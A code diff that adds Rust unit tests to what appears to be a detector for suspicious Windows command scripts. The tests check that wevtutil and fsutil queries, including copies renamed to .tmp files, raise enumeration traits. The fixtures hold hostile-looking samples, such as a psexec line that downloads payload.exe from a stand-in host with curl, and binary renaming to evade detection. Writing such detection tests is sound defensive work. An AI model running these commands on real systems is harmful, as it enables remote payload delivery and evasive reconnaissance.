@@ -4608,6 +4608,67 @@ C:\Users\Public\ns.tmp wlan show profiles
     }
 
     #[test]
+    fn event_and_filesystem_query_commands_emit_enumeration_traits() {
+        let report = analyze(
+            br#"wevtutil qe System /c:1 /f:text
+fsutil dirty query C:
+"#,
+            &AnalyzeConfig::default(),
+        );
+
+        for (kind, command) in [
+            ("event-log-query", "wevtutil qe System /c:1 /f:text"),
+            ("fsutil-query", "fsutil dirty query C:"),
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Enumeration { enum_kind, command: c }
+                        if enum_kind == kind && c == command
+                )),
+                "missing event/filesystem enumeration {kind}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
+    fn copied_event_and_filesystem_query_aliases_emit_enumeration_traits() {
+        let script = br#"copy C:\Windows\System32\wevtutil.exe C:\Users\Public\we.tmp
+C:\Users\Public\we.tmp qe Security /c:1 /f:text
+copy C:\Windows\System32\fsutil.exe C:\Users\Public\fs.tmp
+C:\Users\Public\fs.tmp dirty query C:
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        for target in [r#"C:\Users\Public\we.tmp"#, r#"C:\Users\Public\fs.tmp"#] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::ManipulatedExec { target: t, .. }
+                        if t.eq_ignore_ascii_case(target)
+                )),
+                "copied event/filesystem query alias {target} was not surfaced: {:?}",
+                report.traits
+            );
+        }
+        for (kind, command) in [
+            ("event-log-query", "wevtutil.exe qe Security /c:1 /f:text"),
+            ("fsutil-query", "fsutil.exe dirty query C:"),
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::Enumeration { enum_kind, command: c }
+                        if enum_kind == kind && c == command
+                )),
+                "missing copied event/filesystem enumeration {kind}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
